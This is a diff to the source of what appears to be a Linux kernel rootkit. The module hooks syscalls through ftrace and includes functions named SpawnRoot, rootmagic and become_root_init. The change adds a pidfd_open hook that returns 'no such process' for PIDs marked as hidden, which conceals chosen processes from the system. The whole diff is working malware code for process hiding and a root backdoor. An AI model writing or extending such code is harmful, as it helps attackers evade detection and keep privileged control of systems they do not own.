@@ -13,6 +13,7 @@ static asmlinkage long (*orig_sched_getparam)(const struct pt_regs *);
 static asmlinkage long (*orig_sched_getscheduler)(const struct pt_regs *);
 static asmlinkage long (*orig_sched_rr_get_interval)(const struct pt_regs *);
 static asmlinkage long (*orig_sysinfo)(const struct pt_regs *);
+static asmlinkage long (*orig_pidfd_open)(const struct pt_regs *);
 
 static notrace void SpawnRoot(void);
 static notrace void rootmagic(void);
@@ -50,6 +51,15 @@ static notrace asmlinkage long hook_kill(const struct pt_regs *regs) {
     return orig_kill(regs);
 }
 
+static notrace asmlinkage long hook_pidfd_open(const struct pt_regs *regs)
+{
+    int pid = (int)regs->di;
+    
+    if (should_hide_pid_by_int(pid))
+        return -ESRCH;
+    
+    return orig_pidfd_open(regs);
+}
 
 static notrace asmlinkage long hook_getsid(const struct pt_regs *regs)
 {
@@ -221,6 +231,7 @@ static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_sched_getscheduler", hook_sched_getscheduler, &orig_sched_getscheduler),
     HOOK("__x64_sys_sched_rr_get_interval", hook_sched_rr_get_interval, &orig_sched_rr_get_interval),
     HOOK("__x64_sys_sysinfo", hook_sysinfo, &orig_sysinfo),
+    HOOK("__x64_sys_pidfd_open", hook_pidfd_open, &orig_pidfd_open),
 };
 
 notrace int become_root_init(void) {
